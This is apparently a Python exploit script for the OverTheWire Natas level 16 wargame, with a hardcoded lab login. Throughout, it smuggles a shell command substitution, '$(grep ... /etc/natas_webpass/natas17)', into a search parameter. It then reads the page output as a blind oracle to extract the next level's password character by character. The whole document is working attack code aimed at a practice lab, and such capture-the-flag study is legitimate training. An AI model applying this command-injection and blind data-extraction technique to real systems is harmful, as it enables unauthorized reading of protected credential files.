import requests
import string
from requests.auth import HTTPBasicAuth

# prepare the url
url = 'http://natas16.natas.labs.overthewire.org/index.php?submit=Search&needle='
response = ''
# base auth
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
# all letters and numbers, as strings
chars = list(string.ascii_lowercase) + list(string.ascii_uppercase) + [str(i) for i in range(0,10)]
filtered = list()

password = ''

# find out which chars are in the password at all
for c in chars:
    print c
    # looks for the existence of letters in the file /etc/natas_webpass/natas17
    urlWithParams = url + 'doomed$(grep ' + c + ' /etc/natas_webpass/natas17)'
    x = requests.post(urlWithParams, auth = auth)
    response = x.text
    if (not ('doomed' in response)):
        filtered.append(c)

print filtered

# iteratively build password
anotherMatch = True
while anotherMatch:
    anotherMatch = False
    for c in filtered:
        # its so weird that grep just accepts regex without quotation marks
        urlWithParams = url + 'doomed$(grep ^' + password + c + ' /etc/natas_webpass/natas17)'
        x = requests.post(urlWithParams, auth = auth)
        response = x.text
        if(not ('doomed' in response)):
            anotherMatch = True
            password = password + c
            print(password)
